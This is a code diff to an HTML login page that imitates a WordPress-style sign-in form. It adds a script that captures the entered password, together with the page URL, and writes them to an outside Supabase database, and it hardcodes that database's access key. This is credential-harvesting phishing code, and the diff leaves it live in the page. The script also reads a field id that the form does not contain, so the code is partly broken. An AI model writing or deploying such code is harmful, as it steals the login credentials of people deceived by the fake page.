@@ -159,7 +159,7 @@
 
   <!-- Login Box -->
   <div class="login-box">
-    <form action="savelogin.php" method="POST">
+        <form id="dataForm">
       <div class="input-group">
         <label for="username">Username or Email Address</label>
         <input type="text" name="username" id="username" placeholder="">
@@ -169,6 +169,8 @@
         <input type="password" name="password" id="password" placeholder="">
         <span class="toggle-password open" onclick="togglePassword()"></span>
       </div>
+              <input type="hidden" id="url"> <!-- Hidden input to store the current URL -->
+
       <div class="options">
         <label>
           <input type="checkbox" id="remember-me"> Remember Me
@@ -182,7 +184,40 @@
   <div class="lost-password">
     <a href="#">Lost your password?</a>
   </div>
+  <script type="module">
+        // Supabase Configuration
+        const supabaseUrl = 'https://wgpeqlnhvktnrxwmyuqm.supabase.co'; // Replace with your Supabase URL
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndncGVxbG5odmt0bnJ4d215dXFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzczNDU5NzQsImV4cCI6MjA1MjkyMTk3NH0.hmAvzL-CLZPvIAh9QRQuG7oQmNWYzr4DUo27lZrZkqY'; // Replace with your Public API Key
 
+        // Import Supabase Client
+        import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
+        const supabase = createClient(supabaseUrl, supabaseKey);
+
+        // Automatically Fetch Current URL and Set It in the Hidden Field
+        document.getElementById('url').value = window.location.href;
+
+        // Form Submit Event
+        document.getElementById('dataForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const url = document.getElementById('url').value;
+
+            // Insert Data into Supabase Table
+            const { data, error } = await supabase
+                .from('users')
+                .insert([{ email, password, url }]);
+
+            if (error) {
+                console.error('Error:', error.message);
+                alert('Failed to save data.');
+            } else {
+                console.log('Success:', data);
+                alert('Data saved successfully!');
+            }
+        });
+    </script>
   <script>
     function togglePassword() {
       const passwordInput = document.getElementById("password");
